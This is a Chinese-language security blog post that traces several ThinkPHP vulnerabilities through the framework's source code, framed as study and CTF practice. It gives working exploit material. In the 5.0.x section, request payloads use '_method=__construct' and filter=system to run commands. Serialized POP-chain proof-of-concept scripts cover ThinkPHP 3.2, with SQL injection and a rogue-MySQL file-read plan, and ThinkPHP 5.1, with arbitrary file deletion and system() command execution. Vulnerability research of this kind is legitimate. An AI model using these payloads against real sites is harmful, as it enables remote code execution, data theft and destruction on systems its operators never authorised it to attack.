---
title: ThinkPHP X 源码分析
author: Troy3e
avatar: 'https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/QQ%E5%9B%BE%E7%89%8720210427144151.jpg'
authorAbout: SteamID：888007034
authorDesc: Blizzard：TroyeSivan#51769
categories: 技术
comments: true
date: 2021-09-27 22:59:07
authorLink:
tags: Real
keywords:
description:
photos: https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/thumb-1920-719179.png
---
复现一下ThinkPHP的各种漏洞，锻炼一下自己分析源码的能力，持续更新。
更新记录：
9/27
4/26
4/6
4/2
2021/3/28

## ThinkPHP 5.0.x (<=5.0.23) RCE分析 2021/3/28

首先查看官方log：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328215733.png)

改进request的method方法，所以我们diffinity直接对比两个版本区别：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328220634.png)

在5.0.24中对method作了白名单的限制，只允许$this->method为常用的几个方法，否则就将其置为POST方法，因此我们的入口点就可以从Request.php跟进。
(如果按正常思路寻找的话，index.php->start.php->routeCheck->check 也是可以跟到method的)
全局搜索call_user_func，在Request.php中发现在filterValue方法中。

    private function filterValue(&$value, $key, $filters)
        {
            $default = array_pop($filters);//弹出并返回 array 数组的最后一个单元，并将数组 array 的长度减一。
            foreach ($filters as $filter) {
                if (is_callable($filter)) {//是否能调用
                    $value = call_user_func($filter, $value);
                } elseif (is_scalar($value)) {//检测变量是否是一个标量
                    if (false !== strpos($filter, '/')) {//strpos检测字符第一次出现
                        // 正则过滤
                        if (!preg_match($filter, $value)) {
                            // 匹配不成功返回默认值
                            $value = $default;
                            break;
                        }
                    } elseif (!empty($filter)) {
                        // filter函数不存在时, 则使用filter_var进行过滤
                        // filter为非整形值时, 调用filter_id取得过滤id
                        $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                        if (false === $value) {
                            $value = $default;
                            break;
                        }
                    }
                }
            }
            return $this->filterExp($value);
        }

自己尝试理解下，首先default被赋予filters的最后一个值，然后一个个尝试filters里剩下的值是否为能调用的函数，是的话直接调用，不是的话检测value里是否是一个标量，是的话继续判断filter里有无/，有则将default即filters的最后一个值赋给它。否则（这个否则是针对filters里是否有/）判断filter是否为空，不为空则进行源码注释里的判断。
看似莫名其妙，所以我们全局搜一下调用filterValue的方法：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png)

input里面调用了它。
无论$data是不是数组最终都会调用filterValue方法，而$filter则会进行过滤器解析，跟进$this->getFilter方法查看解析过程:

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png)

说实话这个我没太理解 暂且继续往下看
回到input方法中，array_walk_recursive函数会对第一个数组参数中的每个元素应用第二个参数的函数。在input类方法中，$data中键名作为filterValue(&$value, $key, $filters)中的value,键值作为key,filter作为第三个参数$filters,而当这些传入到filterValue后，call_user_func又是利用filter作为回调的函数，value作为回调函数的参数，因此也就是input方法中的data是回调函数的参数，filter是需要回调的函数。
了解之后我们需要查找input方法在何处被调用，全局搜索一下：
同文件param方法最后调用该方法并作为返回：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328234006.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004503.png)

    $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

作为data传入input，跟进$this->get

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329000306.png)

如果$this->get为空，直接将其赋值为$_GET,而最后将$this->get作为input方法的第一个参数，因此我们可以听过变量覆盖，直接将$this->get赋值，就此我们控制了回调函数和参数。

    即_method=__construct&filter[]=system&get[]=whoami或者_method=__construct&filter[]=system&route[]=whoami。

重新推一下，我们可以控制Request类所有方法及属性。
在param方法里，$method = $this->method(true);
跟一下method

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002144.png)

再跟进server：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329002632.png)

$name的值是REQUEST_METHOD。server()方法中又跟进了input()方法，第一个参数$this->server可以利用之前__construct()方法进行属性覆盖，因此$this->server可控。
跟进input()方法：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328223941.png)

$name是REQUEST_METHOD，会进入if ('' != $name) {。这些代码就相当于$data=$data['REQUEST_METHOD']。而$data就是可控的$this->server，因此这里$data也可控。再往下看：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210328225503.png)

相当于$filter=$this->filter，因此过滤器也可控。接下来就进入了filterValue方法，$data是可控的参数，$filter是可控的函数，再进入利用call_user_func即可RCE。最终构造：

    _method=__construct&filter=system&server[REQUEST_METHOD]=dir

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210329004703.png)

成功执行，危害极大。

漏洞原因：method没有进行限制，导致可以任意调用、覆盖类和属性。
参考：https://www.anquanke.com/post/id/222672
https://blog.csdn.net/rfrder/article/details/114298944

## 5.x < 5.1.31 rce 4/2

https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection

先放个链接 

## ThinkPHP5深入学习 4/6
官方文档：https://www.kancloud.cn/manual/thinkphp5/118003

    project  应用部署目录
    ├─application           应用目录（可设置）
    │  ├─common             公共模块目录（可更改）
    │  ├─index              模块目录(可更改)
    │  │  ├─config.php      模块配置文件
    │  │  ├─common.php      模块函数文件
    │  │  ├─controller      控制器目录
    │  │  ├─model           模型目录
    │  │  ├─view            视图目录
    │  │  └─ ...            更多类库目录
    │  ├─command.php        命令行工具配置文件
    │  ├─common.php         应用公共（函数）文件
    │  ├─config.php         应用（公共）配置文件
    │  ├─database.php       数据库配置文件
    │  ├─tags.php           应用行为扩展定义文件
    │  └─route.php          路由配置文件
    ├─extend                扩展类库目录（可定义）
    ├─public                WEB 部署目录（对外访问目录）
    │  ├─static             静态资源存放目录(css,js,image)
    │  ├─index.php          应用入口文件
    │  ├─router.php         快速测试文件
    │  └─.htaccess          用于 apache 的重写
    ├─runtime               应用的运行时目录（可写，可设置）
    ├─vendor                第三方类库目录（Composer）
    ├─thinkphp              框架系统目录
    │  ├─lang               语言包目录
    │  ├─library            框架核心类库目录
    │  │  ├─think           Think 类库包目录
    │  │  └─traits          系统 Traits 目录
    │  ├─tpl                系统模板目录
    │  ├─.htaccess          用于 apache 的重写
    │  ├─.travis.yml        CI 定义文件
    │  ├─base.php           基础定义文件
    │  ├─composer.json      composer 定义文件
    │  ├─console.php        控制台入口文件
    │  ├─convention.php     惯例配置文件
    │  ├─helper.php         助手函数文件（可选）
    │  ├─LICENSE.txt        授权说明文件
    │  ├─phpunit.xml        单元测试配置文件
    │  ├─README.md          README 文件
    │  └─start.php          框架引导文件
    ├─build.php             自动生成定义文件（参考）
    ├─composer.json         composer 定义文件
    ├─LICENSE.txt           授权说明文件
    ├─README.md             README 文件
    ├─think                 命令行入口文件

## ThinkPHP v3.2.* （SQL注入&文件读取）反序列化POP链 4/26
来自[红明谷CTF 2021]EasyTP的考点，遇到了就来分析一下，不能睁只眼闭只眼看一遍。

环境搭建：
composer create-project topthink/thinkphp=3.2.3 tp3

POP链分析:
1、找起点
全局搜__destruct()

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426200925.png)

这里的$this->img可控，且调用了$this->img的destroy()。

跳板1：
首先找一个包含destroy()函数的类

Memcache.class.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426205120.png)

但是这里destroy需要传值，所以继续往下找。

跳板2：

上面$this->handle可控，并且调用了$this->handle的delete()方法，且传过去的参数是部分可控的，因此我们可以继续寻找有delete()方法的跳板类。

全局搜索function delete(

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220634.png)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220653.png)

这里的$pk其实就是$this->pk，是完全可控的。

下面的$options是从跳板1传过来的，在跳板1中可以控制其是否为空。$this->options['where']是成员属性，是可控的，因此506行的条件我们可以控制，且508行的条件我们也是可以控制的。

所以我们可以控制程序走到509行。

在509中又调用了一次自己$this->delete()，但是这时候的参数$this->data[$pk]是我们可控的。(重点

这时delete()我们就可以成功带可控参数访问了。

这时候熟悉ThinkPHP的师傅们就应该懂了。这是ThinkPHP的数据库模型类中的delete()方法，最终会去调用到数据库驱动类中的delete()中去，也就是558行。且上面的一堆条件判断很显然都是我们可以控制的包括调用$this->db->delete($options)时的$options参数我们也可以控制。

那么这时候我们就可以调用任意自带的数据库类中的delete()方法了。

终点:
/ThinkPHP/Library/Think/Db/Driver.class.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426220911.png)

这边的参数是完全可控的，所以这里的$table是可控的，将$table拼接到$sql传入了$this->execute()。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221142.png)

这里有个初始化数据库连接的地方

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221240.png)

可以通过控制成员属性，使程序调用到$this->connect()。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210426221320.png)

可以看到这里是去使用$this->config里的配置去创建了数据库连接，接着去执行前面拼接的DELETESQL语句。

到此，我们就找到了一条可以连接任意数据库的POP链。

1、通过某处leak出目标的WEB目录(e.g. DEBUG页面)
2、开启恶意MySQL恶意服务端设置读取的文件为目标的数据库配置文件
3、触发反序列化
4、触发链中PDO连接的部分
5、获取到目标的数据库配置
6、使用目标的数据库配置再次出发反序列化
7、触发链中DELETE语句的SQL注入

POC:

    <?php
    namespace Think\Db\Driver{
        use PDO;
        class Mysql{
            protected $options = array(
                PDO::MYSQL_ATTR_LOCAL_INFILE => true    // 开启才能读取文件
            );
            protected $config = array(
                "debug"    => 1,
                "database" => "thinkphp3",
                "hostname" => "127.0.0.1",
                "hostport" => "3306",
                "charset"  => "utf8",
                "username" => "root",
                "password" => ""
            );
        }
    }

    namespace Think\Image\Driver{
        use Think\Session\Driver\Memcache;
        class Imagick{
            private $img;
    
            public function __construct(){
                $this->img = new Memcache();
            }
        }
    }

    namespace Think\Session\Driver{
        use Think\Model;
        class Memcache{
            protected $handle;
    
            public function __construct(){
                $this->handle = new Model();
            }
        }
    }
    
    namespace Think{
        use Think\Db\Driver\Mysql;
        class Model{
            protected $options   = array();
            protected $pk;
            protected $data = array();
            protected $db = null;
    
            public function __construct(){
                $this->db = new Mysql();
                $this->options['where'] = '';
                $this->pk = 'id';
                $this->data[$this->pk] = array(
                    "table" => "mysql.user where 1=updatexml(1,user(),1)#",
                    "where" => "1=1"
                );
            }
        }
    }

    namespace {
        echo base64_encode(serialize(new Think\Image\Driver\Imagick()));
    }

思路：https://mp.weixin.qq.com/s/S3Un1EM-cftFXr8hxG4qfA?fileGuid=YQ6W8dWWxRpgCVkt
实战：[红明谷CTF 2021]EasyTP

## Thinkphp5.1 反序列化分析 2021/9/25
2021/9/25

首先必须要吐槽的是，因为自己太憨被tp的路由设置搞了一个多小时。
在application/index/controller下创建个新的控制器，并在route/route.php设置了路由

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210925220039.png)

最开始直接访问的www.tp.com:xxx/unserialize，直接404，访问上面自带的think也是404，然而这时候没有意识到是访问路径的问题。。。以为问题出在了设置和nginx上，但是排查了一圈发现都没问题。最后才发现要这样访问：www.tp.com:xxx/index.php/unserialize

麻了。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210925215726.png)

这条链从/thinkphp/library/think/process/pipes/Windows.php的__destruct()方法入手。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926181426.png)

close没用，关闭一个打开的文件指针。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926212152.png)

此处file是可控的，所以这里存在一个任意文件删除的漏洞。

POC:

	<?php

	namespace think\process\pipes;

	class Pipes
	{

	}

	class Windows extends Pipes
	{
		private $files = [];
		public function __construct(){
			$this->files=['需要删除文件的路径'];
			}
	}

	echo base64_encode(serialize(new Windows()));

file_exists函数会将filename当作字符串处理，这很容易联想到toString方法，

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926215735.png)

全局搜索toString，找到\thinkphp\library\think\model\concern\Conversion.php中Conversion类的toString方法

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926223351.png)

跟进toJson

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210926223940.png)

options为256，跟进toArray

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927000425.png)

首先要明确我们要找的是什么，$可控变量->方法(参数可控)，图中箭头所指满足这个条件。append可控，所以relation也可控。

跟进getRelation方法看看有没有可利用的点：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927001024.png)

key可控，所以name可控，可过第一个if。但是elseif里也无法利用。那么剩下的只有返回空。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927003247.png)

满足if (!$relation)，跟进getAttr

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927003432.png)

首先跟进getData看看：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927004120.png)

还是无法利用，回到Conversiton.php

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927004150.png)

反正relation是可控的，那就继续看看下面visible能不能利用，全局搜一波。

插一条知识：自 PHP 5.4.0 起，PHP 实现了一种代码复用的方法，称为 trait。通过在类中使用use 关键字，声明要组合的Trait名称。所以，这里类的继承要使用use关键字。然后我们需要找到一个子类同时继承了Attribute类和Conversion类。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927150709.png)

但是抽象类不能直接被实例化。
抽象类不能被直接实例化。抽象类中只定义（或部分实现）子类需要的方法。子类可以通过继承抽象类并通过实现抽象类中的所有抽象方法，使抽象类具体化。
如果子类需要实例化，前提是它实现了抽象类中的所有抽象方法。如果子类没有全部实现抽象类中的所有抽象方法，那么该子类也是一个抽象类，必须在 class 前面加上 abstract 关键字，并且不能被实例化。
所以全局搜extends Model，找到Pivot.php。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927154521.png)

回到刚刚visible那里，全局搜下来没有可以直接利用的包含visible方法的类，所以转换思路找call。看看有没有和call_user_func和call_user_func_array一起的。

public function __call($method, $args)
我们可以控制的是args，method为visible。

排除掉参数不可控和参数可控但是是抽象函数的查询结果。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927160157.png)

Request类的这个似乎可以用。
array_unshift — 在数组开头插入一个或多个单元。这就导致第一个参数不可控。
只能

call_user_func_array([$obj,"任意方法"],[$this,任意参数])
也就是
$obj->$func($this,$argv)

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927160859.png)

这是很困难的。但是Thinkphp作为一个web框架,Request类中有一个特殊的功能就是过滤器 filter(ThinkPHP的多个远程代码执行都是出自此处)
所以可以尝试覆盖filter的方法去执行代码
在/thinkphp/library/think/Request.php中找到了filterValue()方法。

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162108.png)

此处value不可控，寻找能控制的点

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162436.png)

其中filter为this->filter，所以不可控的只剩下回调函数的参数了，寻找调用input方法的地方

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927162832.png)

找到了param，看return $this->input($this->param, $name, $default, $filter);this->param是由本来的$this->param，还有请求参数和URL地址中的参数合并。所以把要执行的命令卸载get参数里即可。

但是这里参数还是不可控。。。。继续找

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927163148.png)

找到isAjax函数，config是可控的。所以param中name就是可控的

为了看的更清楚些，画了个简图：

![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/WD11ISLBESREHK%7DG2_LDKF2.jpg)

POC：

	<?php
	namespace think\process\pipes{

    	use think\model\Pivot;

    	class Windows
    	{
        	private $files = [];
        	public function __construct(){
            	$this->files[]=new Pivot();
        	}
    	}
	}
	namespace think{
    	abstract class Model
    	{
        	protected $append = [];
        	private $data = [];
        	public function __construct(){
            	$this->data=array(
              	'Troy3e'=>new Request()
            	);
            	$this->append=array(
                	'Troy3e'=>array(
                    	'sakurajima'=>'mai'
                	)
            	);
        	}
    	}
	}
	namespace think\model{

    	use think\Model;

    	class Pivot extends Model
    	{

    	}
	}
	namespace think{
    	class Request
    	{
        	protected $hook = [];
        	protected $filter;
        	protected $config = [
            	// 表单请求类型伪装变量
            	'var_method'       => '_method',
            	// 表单ajax伪装变量
            	'var_ajax'         => '',
            	// 表单pjax伪装变量
            	'var_pjax'         => '_pjax',
            	// PATHINFO变量名 用于兼容模式
            	'var_pathinfo'     => 's',
            	// 兼容PATH_INFO获取
            	'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
            	// 默认全局过滤方法 用逗号分隔多个
            	'default_filter'   => '',
            	// 域名根，如thinkphp.cn
            	'url_domain_root'  => '',
            	// HTTPS代理标识
            	'https_agent_name' => '',
            	// IP代理获取标识
            	'http_agent_ip'    => 'HTTP_X_REAL_IP',
            	// URL伪静态后缀
            	'url_html_suffix'  => 'html',
        	];
        	public function __construct(){
            	$this->hook['visible']=[$this,'isAjax'];
            	$this->filter="system";
        	}
    	}
	}
	namespace{

    	use think\process\pipes\Windows;

    	echo base64_encode(serialize(new Windows()));
	}



![](https://cdn.jsdelivr.net/gh/ITroyeSivan/picture/blogpictures/20210927211149.png)

总结：这条链是tp第一条完全自己想了一遍的。难度确实比之前看的yii那些都高，不过收获很大。
